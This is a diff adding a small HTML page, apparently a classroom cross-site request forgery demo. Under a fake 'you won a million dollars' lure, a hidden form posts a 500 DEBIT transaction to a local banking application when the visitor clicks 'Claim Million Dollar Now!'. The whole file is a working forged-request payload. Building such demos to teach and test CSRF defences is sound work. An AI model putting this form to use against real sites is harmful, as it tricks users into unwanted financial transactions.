@@ -1,0 +1,18 @@
+﻿<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8" />
+    <title>Million Dollar Scam</title>
+    <link href="lib/bootstrap/dist/css/bootstrap.css" rel="stylesheet" />
+</head>
+<body>
+    <h1 class="text-center text-primary"  style="margin-top: 150px;">You won a jackpot of 1 million dollars! To claim that you have a go to a specific link to a web application where you have to press a big red button that says, 'Claim Million Dollar Now!'</h1>
+    <form action="http://localhost:55402/Transaction/Add" method="post">
+        <input type="hidden" name="transactionAmount" value="500" />
+        <input type="hidden" name="transactionType" value="DEBIT" />
+        <div class="text-center">
+            <input type="submit" class="btn btn-lg btn-danger" style="margin-top: 50px;" value="Claim Million Dollar Now!" />
+        </div>
+    </form>
+</body>
+</html>
